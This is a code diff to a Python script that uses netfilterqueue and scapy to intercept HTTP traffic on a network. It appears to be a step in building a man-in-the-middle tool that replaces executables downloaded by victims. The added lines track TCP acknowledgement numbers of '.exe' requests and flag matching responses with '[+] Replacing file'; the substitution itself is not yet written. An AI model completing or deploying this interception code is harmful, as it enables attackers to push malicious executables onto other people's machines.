@@ -15,17 +15,25 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
+
 def process_packet(packet):
 	scapy_packet = scapy.IP(packet.get_payload()) #convert netfilterqueue packet into scapy packet so we can use scapy filters
 	if scapy_packet.haslayer(scapy.Raw): #raw layer is where html is stored
+
 		if scapy_packet[scapy.TCP].dport == 80: # default http port is 80
-			print("HTTP request")
+
 			if ".exe" in scapy_packet[scapy.Raw].load:
 				print("[+] EXE request")
+				ack_list.append(scapy_packet[scapy.TCP].ack)
 				print(scapy_packet.show())
+
 		elif scapy_packet[scapy.TCP].sport == 80: # default http port is 80
-			print("HTTP response")
-			print(scapy_packet.show())
+			if (scapy_packet[scapy.TCP].seq) in ack_list: # if the sequence matches an ack in ack_list it means a download request has been made and the TCP handshake is complete
+				ack_list.remove(scapy_packet[scapy.TCP].seq)
+				print("[+] Replacing file")
+				print(scapy_packet.show())
+
 
 	packet.accept()
 
